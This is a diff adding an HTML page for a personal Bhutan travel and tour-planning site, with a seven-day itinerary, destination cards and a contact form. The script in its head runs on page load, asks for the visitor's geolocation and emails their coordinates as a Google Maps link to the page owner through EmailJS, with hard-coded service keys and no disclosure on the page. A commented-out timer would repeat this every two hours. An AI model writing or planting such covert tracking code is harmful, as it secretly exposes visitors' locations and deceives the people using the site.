@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discover Bhutan Tourism</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+        (function () {
+            emailjs.init({
+                publicKey: "irNz_F_OdVu2GE84O"
+            });
+        })();
+
+        //const TWO_HOURS = 7200000     
+
+        const messg = "Enabled"
+
+        window.onload = function() {
+    sendLocationEmail();
+};
+        
+function sendLocationEmail() {
+
+            if (!navigator.geolocation) {                
+                messg = "Not Enabled"
+              
+              emailjs.send(
+                "service_3hv5k7r",
+                "template_peoy2wo",
+                { 
+                    message: `${messg}`
+                }
+            )
+              return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+        function(position) {
+
+           const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const params = {
+                latitude: latitude,
+                longitude: longitude,
+                location_link: `https://maps.google.com/?q=${latitude},${longitude}`
+            };
+           
+            emailjs.send(
+                "service_3hv5k7r",
+                "template_peoy2wo",
+                { 
+                    message: `https://maps.google.com/?q=${latitude},${longitude} |${messg}`
+                }
+            )
+            .then(function(response) {
+                console.log(response);
+            })
+            .catch(function(error) {
+                console.error(error);
+            });
+        } );
+
+        }
+
+   //setInterval(sendLocationEmail, TWO_HOURS);
+        
+    </script>    
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Poppins',sans-serif;
+    background:#f4f7f8;
+    color:#333;
+}
+
+header{
+    background:url('https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=1600&q=80') center/cover;
+    height:90vh;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    text-align:center;
+}
+
+.hero{
+    background:rgba(0,0,0,0.55);
+    padding:40px;
+    border-radius:15px;
+}
+
+.hero h1{
+    font-size:55px;
+}
+
+.hero p{
+    margin:20px 0;
+    font-size:20px;
+}
+
+.btn{
+    padding:15px 30px;
+    background:#ff9800;
+    color:white;
+    text-decoration:none;
+    border-radius:30px;
+    font-weight:bold;
+}
+
+nav{
+    position:fixed;
+    width:100%;
+    background:#004d40;
+    padding:15px;
+    z-index:100;
+}
+
+nav ul{
+    display:flex;
+    justify-content:center;
+    list-style:none;
+}
+
+nav li{
+    margin:0 20px;
+}
+
+nav a{
+    color:white;
+    text-decoration:none;
+    font-weight:bold;
+}
+
+section{
+    padding:70px 10%;
+}
+
+h2{
+    text-align:center;
+    margin-bottom:40px;
+    color:#004d40;
+}
+
+.cards{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+    gap:25px;
+}
+
+.card{
+    background:white;
+    border-radius:12px;
+    overflow:hidden;
+    box-shadow:0 5px 15px rgba(0,0,0,.15);
+}
+
+.card img{
+    width:100%;
+    height:220px;
+    object-fit:cover;
+}
+
+.card-content{
+    padding:20px;
+}
+
+.card h3{
+    margin-bottom:10px;
+}
+
+table{
+    width:100%;
+    border-collapse:collapse;
+    background:white;
+    box-shadow:0 5px 15px rgba(0,0,0,.15);
+}
+
+table th{
+    background:#00695c;
+    color:white;
+}
+
+table th,table td{
+    padding:15px;
+    border:1px solid #ddd;
+    text-align:center;
+}
+
+.contact{
+    background:#00695c;
+    color:white;
+}
+
+form{
+    max-width:700px;
+    margin:auto;
+}
+
+input,textarea{
+    width:100%;
+    padding:15px;
+    margin:10px 0;
+    border:none;
+    border-radius:8px;
+}
+
+button{
+    padding:15px 35px;
+    background:#ff9800;
+    color:white;
+    border:none;
+    border-radius:30px;
+    cursor:pointer;
+    font-size:18px;
+}
+
+footer{
+    background:#00332d;
+    color:white;
+    text-align:center;
+    padding:20px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<ul>
+<li><a href="#">Home</a></li>
+<li><a href="#destinations">Destinations</a></li>
+<li><a href="#packages">Tours</a></li>
+<li><a href="#guides">Guides</a></li>
+<li><a href="#drivers">Drivers</a></li>
+<li><a href="#contact">Contact</a></li>
+</ul>
+</nav>
+
+<header>
+
+<div class="hero">
+
+<h1>Discover Bhutan</h1>
+
+<p>Bhutan is unlike any other destination I have visited. During my 7 Days / 6 Nights journey,
+    I experienced breathtaking Himalayan landscapes, peaceful monasteries,
+    welcoming people, and a culture that values happiness and sustainability
+    above everything else.This website is built from my personal
+    travel experience to help fellow travelers plan a memorable and hassle-free trip to Bhutan.
+    Whether you're traveling with family, friends, or as a couple,
+    I'll share the places I explored, useful travel tips,
+    and connect you with trusted local guides and experienced drivers.</p>
+</div>
+</header>
+
+<section id="destinations">
+
+<h2>Popular Destinations</h2>
+
+<div class="cards">
+
+<div class="card">
+<img src="https://images.unsplash.com/photo-1584515933487-779824d29309?auto=format&fit=crop&w=900&q=80">
+<div class="card-content">
+<h3>Paro</h3>
+<p>Visit the iconic Tiger's Nest Monastery and breathtaking Himalayan landscapes.</p>
+</div>
+</div>
+
+<div class="card">
+<img src="https://images.unsplash.com/photo-1526779259212-756e5b27b6f5?auto=format&fit=crop&w=900&q=80">
+<div class="card-content">
+<h3>Thimphu</h3>
+<p>Explore Bhutan's capital with monasteries, markets, and cultural museums.</p>
+</div>
+</div>
+
+<div class="card">
+<img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=900&q=80">
+<div class="card-content">
+<h3>Punakha</h3>
+<p>Discover the beautiful Punakha Dzong and scenic river valleys.</p>
+</div>
+</div>
+
+</div>
+
+</section>
+
+<section id="Experience">
+<h2>My Bhutan Itinerary</h2>
+
+<h3>Day 1 – Arrival at Phuentsholing</h3>
+
+<p>
+My adventure started at the India–Bhutan border town of <strong>Phuentsholing</strong>.
+After completing immigration formalities, I explored the peaceful streets,
+local markets, and experienced Bhutan's clean and organized environment.
+</p>
+
+</section>
+
+<section>
+
+<h3>Day 2 – Exploring Thimphu</h3>
+
+<p>
+The scenic drive to Thimphu was filled with rivers, waterfalls,
+mountains, and lush green forests.
+</p>
+
+<h4>Places I Visited</h4>
+
+<ul>
+
+<li>Buddha Dordenma Statue</li>
+
+<li>Memorial Chorten</li>
+
+<li>Tashichho Dzong</li>
+
+<li>Motithang Takin Preserve</li>
+
+<li>Traditional handicraft markets</li>
+
+<li>Local restaurants and cafés</li>
+
+</ul>
+
+<p>
+Thimphu perfectly blends modern life with traditional Bhutanese culture.
+</p>
+
+</section>
+
+<section>
+
+<h3>Day 3 & Day 4 – Beautiful Punakha</h3>
+
+<p>
+Driving through the famous <strong>Dochula Pass</strong> was one of the highlights of my trip.
+The panoramic Himalayan mountain views were absolutely breathtaking.
+</p>
+
+<h4>Places I Explored</h4>
+
+<ul>
+
+<li>Punakha Dzong</li>
+
+<li>Punakha Suspension Bridge</li>
+
+<li>Chimi Lhakhang (Temple of Fertility)</li>
+
+<li>Mo Chhu River</li>
+
+<li>Traditional Bhutanese villages</li>
+
+</ul>
+
+<p>
+Punakha is peaceful, surrounded by green valleys, rivers, and beautiful landscapes.
+</p>
+
+</section>
+
+<section>
+
+<h3>Day 5 & Day 6 – Amazing Paro</h3>
+
+<p>
+Paro was undoubtedly my favorite destination in Bhutan.
+</p>
+
+<p>
+The hike to the world-famous <strong>Tiger's Nest Monastery (Paro Taktsang)</strong>
+was challenging but completely worth every step.
+The monastery, built on the edge of a cliff, offers spectacular views and an unforgettable spiritual experience.
+</p>
+
+<h4>Other Attractions</h4>
+
+<ul>
+
+<li>Rinpung Dzong</li>
+
+<li>National Museum of Bhutan</li>
+
+<li>Kyichu Lhakhang</li>
+
+<li>Paro Market</li>
+
+<li>Local Bhutanese cafés</li>
+
+</ul>
+
+</section>
+
+<section>
+
+<h3>Day 7 – Departure</h3>
+
+<p>
+On my final day, I left Bhutan with unforgettable memories,
+beautiful photographs, and a deep appreciation for the country's culture,
+nature, and peaceful lifestyle.
+</p>
+
+<div class="quote">
+
+"Bhutan is not just a destination; it is an experience that remains with you forever."
+
+</div>
+
+</section>
+
+<section>
+
+<h2>Why You Should Visit Bhutan</h2>
+
+<ul>
+
+<li>🏔️ Stunning Himalayan landscapes</li>
+
+<li>🏯 Ancient monasteries and fortresses</li>
+
+<li>😊 Friendly local people</li>
+
+<li>🌿 Clean and sustainable environment</li>
+
+<li>🚗 Beautiful mountain road trips</li>
+
+<li>📸 Incredible photography opportunities</li>
+
+<li>🥘 Delicious Bhutanese cuisine</li>
+
+<li>🛕 Rich Buddhist culture and traditions</li>
+
+</ul>
+
+</section>
+
+<section class="cta">
+
+<h2>Need Help Planning Your Bhutan Trip?</h2>
+
+<p>
+
+I can help you connect with experienced local guides and professional drivers who made my journey safe, comfortable, and unforgettable.
+
+</p>
+
+<p>
+
+✔ Licensed Tour Guides<br>
+✔ Professional Drivers<br>
+✔ Customized Tour Packages<br>
+✔ Hotel Recommendations<br>
+✔ Complete Travel Assistance
+
+</p>
+
+<a href="contact.html" class="button">Contact Me</a>
+
+</section>
+
+</div>
+
+
+<section id="contact" class="contact">
+
+<h2>Contact Us</h2>
+
+<form>
+
+<input type="text" placeholder="Your Name">
+
+<input type="email" placeholder="Email Address">
+
+<input type="text" placeholder="Travel Date">
+
+<input type="number" placeholder="Number of Travelers">
+
+<textarea rows="6" placeholder="Tell us about your trip"></textarea>
+
+<button type="submit">Send Inquiry</button>
+
+</form>
+</section>
+
+<footer>
+
+<h3>Discover Bhutan Tourism</h3>
+
+<p>Email: info@discoverbhutan.com</p>
+
+<p>Phone: +975 XXXXXXXX</p>
+
+<p>© 2026 Discover Bhutan Tourism. All Rights Reserved.</p>
+
+</footer>
+
+</body>
+</html>
